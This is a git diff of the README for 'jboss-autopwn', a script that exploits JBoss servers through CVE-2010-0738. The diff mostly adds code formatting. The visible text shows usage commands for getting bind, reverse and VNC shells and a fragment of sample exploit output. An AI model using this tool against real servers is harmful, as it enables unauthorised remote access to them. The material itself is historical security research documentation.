@@ -1,8 +1,8 @@
 # jboss-autopwn
 JBoss Autopwn as featured at BlackHat Europe 2010 - this version incorporates CVE-2010-0738 the JBoss authentication bypass VERB manipulation vulnerability as discovered by Minded Security
-JBoss Autopwn Script
-Christian G. Papathanasiou
-http://www.spiderlabs.com
+
+C. Papathanasiou 2010
+
 
 INTRODUCTION
 ============
@@ -30,19 +30,19 @@ USAGE
 =====
 
 Use e.sh for *nix targets that use bind_tcp and reverse_tcp
-
+```
 ./e.sh target_ip tcp_port
-
+```
 Use e2.sh for Windows targets that can execute Metasploit Windows payloads
-
+```
 /e2.sh target_ip tcp_port
-
+```
 
 EXAMPLES
 ========
 
 Linux bind shell:
-
+```
 [root@nitrogen jboss]# ./e.sh 192.168.1.2 8080 2>/dev/null
 [x] Retrieving cookie
 [x] Now creating BSH script...
@@ -231,7 +231,7 @@ Windows VNC shell:
 
 >>VNC window opens here.. :-)
 
-
+```
 COPYRIGHT
 =========
 
